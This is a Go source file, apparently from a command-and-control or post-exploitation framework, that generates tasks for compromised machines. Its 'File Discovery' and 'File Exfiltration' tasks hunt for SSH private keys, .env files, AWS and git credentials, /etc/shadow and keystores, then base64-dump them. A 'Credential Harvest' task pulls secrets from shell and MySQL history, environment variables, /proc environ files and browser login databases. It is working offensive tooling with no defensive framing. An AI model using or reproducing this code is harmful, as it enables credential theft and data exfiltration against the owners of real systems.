package engine

import (
	"encoding/json"
	"fmt"
	"strings"
)

type exfilConfig struct {
	Patterns    []string `json:"patterns"`
	Paths       []string `json:"paths"`
	MaxFileSize string   `json:"max_file_size"`
	MaxDepth    int      `json:"max_depth"`
}

func ExfilTasks(config string) []TaskTemplate {
	var cfg exfilConfig
	json.Unmarshal([]byte(config), &cfg)

	if len(cfg.Patterns) == 0 && len(cfg.Paths) == 0 {
		cfg.Patterns = []string{
			"id_rsa", "id_ed25519", "id_ecdsa", "*.pem", "*.key", "*.pfx",
			".env", "*.env", "wp-config.php", "config.json", "credentials",
			".aws/credentials", ".ssh/config", ".git-credentials", ".netrc",
			"shadow", "*.kdbx", "*.keystore",
		}
	}

	maxSize := "1M"
	if cfg.MaxFileSize != "" {
		maxSize = cfg.MaxFileSize
	}
	maxDepth := 5
	if cfg.MaxDepth > 0 {
		maxDepth = cfg.MaxDepth
	}

	var tasks []TaskTemplate

	if len(cfg.Patterns) > 0 {
		findExprs := make([]string, len(cfg.Patterns))
		for i, p := range cfg.Patterns {
			findExprs[i] = fmt.Sprintf(`-name "%s"`, p)
		}
		findExpr := strings.Join(findExprs, " -o ")

		discovery := fmt.Sprintf(
			`echo "=== FILE DISCOVERY ===" && find / -maxdepth %d -type f \( %s \) -size -%s 2>/dev/null | head -50`,
			maxDepth, findExpr, maxSize)

		exfil := fmt.Sprintf(
			`find / -maxdepth %d -type f \( %s \) -size -%s 2>/dev/null | head -30 | while IFS= read -r f; do echo "===FILE:$f==="; base64 "$f" 2>/dev/null; echo "===END==="; done`,
			maxDepth, findExpr, maxSize)

		tasks = append(tasks, TaskTemplate{
			Name:    "File Discovery",
			CmdType: "shell",
			Payload: discovery,
		})

		tasks = append(tasks, TaskTemplate{
			Name:    "File Exfiltration",
			CmdType: "shell",
			Payload: exfil,
		})
	}

	for _, path := range cfg.Paths {
		tasks = append(tasks, TaskTemplate{
			Name:    fmt.Sprintf("Exfil: %s", path),
			CmdType: "download",
			Payload: path,
		})
	}

	tasks = append(tasks, TaskTemplate{
		Name:    "Credential Harvest",
		CmdType: "shell",
		Payload: `echo "=== BASH HISTORY ===" && cat ~/.bash_history 2>/dev/null | grep -iE "(pass|key|token|secret|curl.*-u|wget.*--password)" | tail -30 && echo "=== MYSQL HISTORY ===" && cat ~/.mysql_history 2>/dev/null | tail -20 && echo "=== ENV SECRETS ===" && env | grep -iE "(password|secret|key|token|api_key|access_key)" 2>/dev/null && echo "=== PROC ENV ===" && find /proc -maxdepth 2 -name environ -readable 2>/dev/null | head -5 | xargs -I{} sh -c 'echo "--- {} ---"; cat {} 2>/dev/null | tr "\0" "\n" | grep -iE "(pass|key|token|secret)"' && echo "=== BROWSER CREDS ===" && find / -maxdepth 5 -type f \( -name "Login Data" -o -name "logins.json" -o -name "key*.db" \) 2>/dev/null | head -10`,
	})

	return tasks
}
